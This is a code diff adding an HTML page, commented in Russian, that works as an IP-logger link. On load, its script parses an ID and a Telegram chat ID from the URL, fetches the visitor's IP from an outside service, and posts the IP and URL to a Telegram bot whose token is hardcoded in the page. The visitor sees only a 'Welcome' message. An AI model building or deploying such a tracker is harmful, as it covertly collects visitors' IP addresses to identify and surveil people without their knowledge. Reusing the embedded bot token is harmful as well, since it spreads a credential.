@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Tracking Page</title>
+</head>
+<body>
+  <h2>Welcome</h2>
+  <p>If you see this, tracking worked.</p>
+
+  <script>
+    const BOT_TOKEN = "8254985090:AAEmnwYKpxW5zsB5RrbzTUNj8aNA8MasEeM"; // твой бот
+
+    // Твоя функция расшифровки токена
+    function decodeToken(token) {
+      // пример: просто реверс строки
+      return token.split("").reverse().join("");
+    }
+
+    async function sendToTelegram(chatId, message) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const payload = {
+        chat_id: chatId,
+        text: message,
+        parse_mode: "HTML"
+      };
+      try {
+        await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        console.error("Telegram send error:", e);
+      }
+    }
+
+    async function main() {
+      // путь вида /lg/u=TOKEN/c=CHATID
+      const path = window.location.pathname;
+      const match = path.match(/\/lg\/u=([^\/]+)\/c=([^\/]+)/);
+      if (!match) return;
+      const token = match[1];
+      const chatId = match[2];
+
+      const decodedId = decodeToken(token);
+
+      // получаем IP через внешний сервис
+      let ip = "unknown";
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        ip = data.ip;
+      } catch (e) {
+        console.error("IP fetch error:", e);
+      }
+
+      const msg = `🚨 <b>Visit detected</b>\nID: <code>${decodedId}</code>\nIP: <code>${ip}</code>\nURL: ${window.location.href}`;
+      await sendToTelegram(chatId, msg);
+    }
+
+    main();
+  </script>
+</body>
+</html>
